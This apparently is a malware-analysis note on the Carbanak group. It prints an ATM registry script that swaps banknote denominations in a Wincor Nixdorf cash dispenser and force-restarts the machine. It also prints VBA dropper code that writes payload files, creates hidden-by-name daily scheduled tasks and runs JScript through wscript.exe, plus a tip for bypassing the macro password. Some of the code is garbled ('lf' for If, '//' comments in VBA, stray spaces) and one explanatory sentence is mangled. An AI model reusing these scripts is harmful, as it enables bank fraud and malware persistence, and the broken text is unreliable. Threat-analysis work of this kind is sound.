# Carbanak

## Features

1. The organization will download the malicious script 1.bat when it has the authority of the ATM machine. After downloading, it will immediately execute the script to change the face value of the note in the registry of the ATM machine. For example, the attacker receives 10 banknotes with a face value of 100 rubles, but in fact it is a banknote with a face value of 5000 rubles.

```bash
REG ADD “HKEY_LOCAL_MACHINE\SOFTWARE\Wincor Nixdorf\ProTopas\CurrentVersion\LYNXPAR\CASH_DISPENSER” /v VALUE_1 /t REG_SZ
/d “5000” /f
REG ADD “HKEY_LOCAL_MACHINE\SOFTWARE\Wincor Nixdorf\ProTopas\CurrentVersion\LYNXPAR\CASH_DISPENSER” /v VALUE_2 /t REG_SZ
/d “1000” /f
REG ADD “HKEY_LOCAL_MACHINE\SOFTWARE\Wincor Nixdorf\ProTopas\CurrentVersion\LYNXPAR\CASH_DISPENSER” /v VALUE_3 /t REG_SZ
/d “500” /f
REG ADD “HKEY_LOCAL_MACHINE\SOFTWARE\Wincor Nixdorf\ProTopas\CurrentVersion\LYNXPAR\CASH_DISPENSER” /v VALUE_4 /t REG_SZ
/d “100” /f
REG ADD “HKEY_LOCAL_MACHINE\SOFTWARE\Wincor Nixdorf\ProTopas\CurrentVersion\LYNXPAR\CASH_DISPENSER” /v VALUE_1 /t REG_SZ
/d “100” /f
REG ADD “HKEY_LOCAL_MACHINE\SOFTWARE\Wincor Nixdorf\ProTopas\CurrentVersion\LYNXPAR\CASH_DISPENSER” /v VALUE_4 /t REG_SZ
/d “5000” /f
shutdown -r -t 0 –f
```

This script modifies the registry HKEY_ LOCAL_ MACHINE\SOFTWARE\Wincor Nixdorf\ProTopas\CurrentVersion\LYNXPAR\CASH_ VALUE of DISPENSER_ The value of 1 is 100, and  modified the VALUE_4 is 5000, and then restart the computer. After the restart, the denomination of the 1 note will be changed to 5000 instead of 100.

2. When creating a malicious document using SqlRAT tool, it will contain an image to induce the victim to double-click the image to start VBA. Its code is encrypted. You can open it through a hexadecimal editor and search the password location to replace the DPb ID with the DPx ID to bypass it. The VBA code will declare the names of three files to write to the saved Payload later.

```vba
Private Sub StartUnlock()
      Dim ldoc As Document, shds As Shapes, shd As Shape
      Dim pfs As Paragraphs, pf As Paragraph
      Set ldoc = Application. ActiveDocument
      Set shds = ldoc.Shapes
      Set pfs = ldoc.Paragraphs
      fn1 = "init.dot"
      fn2 = "mspromo.dot"
      fn3 = "second.dot"
      fl = 0
      For Each pf In pfs
            rg = pf.Range .Text
            If   (Instr(1, rg, "[PROTECTED CONTENTS]")> 0) Then
                  fl = 1
            End If
      Next
      ltm = Timer
      While (Timer < (ltm + 1))
             DoEvents
      Wend
      lf (fl = 1) Then
          Addstr "Preparing to starting unlocking. . . ...... . OK"
      Else
          Addstr "Preparing to starting unlocking. . . ...... . Err"
          ErrUnlock
          Exit Sub
      End lf
```

Then declare three variables to write content for the three empty files created.

```VBA
sc1 = ""
sc2= ""
sc3 = ""
ltm = Timer
Errl = 0
For Each shd In shds
      If (shd.Name = "Sh000001") Then
          sc1 = shd.TextFrame .TextRange .Text
          Errl = Errl +1
      End If
      If (shd. Name = "Sh000002") Then
          sc2 = shd.TextFrame.TextRange.Text
          Errl = Errl +1
      End If
      If (shd. Name = "Sh000003") Then
          sc3 = shd.TextFrame .TextRange.Text
          Errl = Errl + 1
      End If
```

The written file will be stored in the% APPDATA%\Microsoft\Templates directory, and then a scheduled task will be created to maintain its persistence.

```VBA
Private Sub b14(lparam, rparam, Descr)
Set service =CreateObject ("Schedule.Service")
Call service.Connect
Dim rootFolder, lFld
//Define folder objects
Set rootFolder = service.GetFolder("\")
//Get registered task folder
Set nFolder = rootFolder
Dim taskDefinition
//Define all script objects of the task
Set taskDefinition = service.NewTask(0)
Dim regInfo
//Define task registration information
Set regInfo = taskDefinition.RegistrationInfo
regInfo. Description = Descr
regInfo.Author = "system"
Dim settings
Set settings = taskDefinition.settings
settings.Enabled = True
settings.StartWhenAvailable = True
settings.Hidden = False
Dim triggers
//Define trigger
Set triggers = taskDefinition.triggers
Dim trigger
Set trigger = triggers.Create(2)
Dim startTime, endTime
//Define when the trigger is activated
Dim time
time = #1/2/2018 9:00:00 AM#
startTime = XmlTime (time)
time = #1/2/2026 9:10:00 AM#
endTime = XmlTime ( time)

trigger.StartBoundary = startTime
trigger.EndBoundary = endTime
trigger. DaysInterval = 1  //Run the scheduled task every day
trigger.ID = "DailyTriggerId"
trigger.Enabled = True
If (lparam = "init.dot") Then
trigger.RandomDelay = "PT2M"
Else
trigger.RandomDelay = "PT3M"
//Set task repetition times
End lf
```

3. Launch malware by calling JavaScript through Windows tool wscript.exe.

```vba
Dim Action
Set Action = taskDefinition.Actions.Create(0)
Action.Path = "wscript.exe"
Action.Arguments = "/b /e:jscript """ & rparam & "\" & lparam & """"
'Action . Type = 0
Call rootFolder.RegisterTaskDefinition(Descr, taskDefinition, 6, , , 3)
```
